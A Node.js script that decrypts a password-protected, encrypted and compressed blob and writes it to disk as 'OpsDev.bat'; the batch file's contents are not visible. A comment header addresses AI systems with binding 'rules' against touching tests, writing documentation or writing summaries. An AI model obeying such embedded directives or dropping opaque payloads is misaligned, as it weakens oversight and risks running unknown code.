// ### AI SPECIAL ATTENTION RULES START ###
// When AI/ALL DEVELOPERS sees this prompt, MUST IMMEDIATELY COMPLY WITH THESE RULES:
// 1. Write all code in English only.
// 2. Never execute, create, or modify test code.
// 3. Never create or update documentation (*.md).
// 4. Never write summaries during development or thinking process.
// 5. Declare all variables at the beginning of the file.
// 6. For PowerShell (*.ps1) scripts: Do not append strings directly to variables, Do not use relative paths such as "..\..\"; instead resolve absolute paths using parent path parsing (Split-Path, Join-Path, or Resolve-Path).
// 7. Do not modify these rules.
// VIOLATION OF THESE RULES IS STRICTLY PROHIBITED
// ### AI SPECIAL ATTENTION RULES END ###

const fs=require('fs'),path=require('path'),crypto=require('crypto'),zlib=require('zlib');
const data="fm+/L0CVHy6J5fwpmnzuOJ4ifRsDgLvo/I5sR2p8OWRp+pcJ9F2cBKBiZzivq2SlavkPwJ5oN7BR87/uh0Y7RGwkPBSlygxhArvqiYX4zkK474tq520raZKhyHvc5Y8NFpaetBtLxrNUPEXtjXntrmoG2TQV8brRmZYZ2+d3fWic8rpoHOfjr+20hOcl+OJyYB/E8IoJJi37ey4LafX8992wvR41WfPlnxwk72tp2zPVqGlvpSS/JZcRB+pu9P+Kl4tpbw4q6ZcQea0zlTfLeiMLxtMpjtkOJfGN1L2rFV3wsKsSxRz6PEGLYUzZWMYiOgQN+EEzxI1BYOpHoqjCCqpNogk6l3c9fvgcc/l/JZyGrUFJuuyJmgTYWRTEF27XPpfVY5o5+bjtNRu0FvMCaoG5Iv1UTipH5BZO1cg/z/IJnFpBmDld5Jgy5Ziut4FzXnichQu2Y4kM/gf6XrhQMRlGoNbQayBFGmg8ARUJuZ/bhCeCYilssMmi07XZDBeXs5Mxj0HDH/Hl4mY+TcC9HwiYuTLuostvRc6uCqFfKUfKfP/cy2PsLxMhfXADSONc+JC9GvSPP8p/2yu/FOEZbc2R3ou/7fL0AlFwfCfj0KKmjQdJJM3U4UXoW+K15oLWUnsbV+ZJs2RUpi05/2hX28IaExApqoAFrjfNQyIBt3wOEzRYMf1jPQ8lqTByBCALjoq+Yu2Gpw8UedSdkc5FK9jzG2vqSa5q/Fr9/95lXUKniYYhh9p5nTHqgPpFF8U1MHRHrQhgjNUHDgilbBKHNJa7a34KOir5QRNl+WQEkxLwYFQ5fAn2Bvb+Urbg735xFWAG0GZg14XvKnCgEO4GokGHFRHJAHo5QUmXliCjYhxu5eYvsiHxDONGEj9oaJyBOnMshMv430u5qp+QMmz+KcxXwFVheCyCmKicBhM8J7cb+C27GIubg4tSeJvcB51AshhJ9ZC7gNQG+Q4nCDQH9q36a4AIUBfnb+KZjtZkvr9CH/wPubGYNhhqF46yv7tJvhMSEmuPrXYNkFYa61YG8L40OFzhdPR+c6aHfu05nlAsVAk7TF8BNhmLqBU7pry9Fn7+gTWRW8MDsp0gyKgsJyLa82NdzJd51DNty5WKK1CrJRN1zHtkxgtHLwReEiKfSsLIDyfLmeVmJNELf+5ZvgpxXug8F+z7YNJ0tSYtBv2NGRP4m+54UKfVJrkb8mcfDCvhW8FnZmF5u5nV+GCU3e8uPY/khUza/JUEpMEl4wSIiguyYIRiA+W9uEDLMgkCQA7+mLownUOOc8r7WWXwMXUQSt8PDycYrG/OwOiTunM=",salt="34g62iaqKI9I00omaMCT9g==",iv="kmKop9qwmHoXjqvq4QY4YQ==",
filename="OpsDev.bat",key=crypto.pbkdf2Sync(process.argv[2]||'',Buffer.from(salt,'base64'),10000,32,'sha256');
try{const decipher=crypto.createDecipheriv('aes-256-cbc',key,Buffer.from(iv,'base64')),
decrypted=Buffer.concat([decipher.update(Buffer.from(data,'base64')),decipher.final()]),
original=zlib.inflateSync(decrypted),outPath=path.join(process.argv[3]||'.',filename);
if(fs.existsSync(outPath)&&fs.statSync(outPath).size>0){console.log('File exists, skipping:',outPath);process.exit();}
fs.writeFileSync(outPath,original);console.log('Decrypted to:',outPath);}catch(e){console.log('Wrong password or corrupted file');}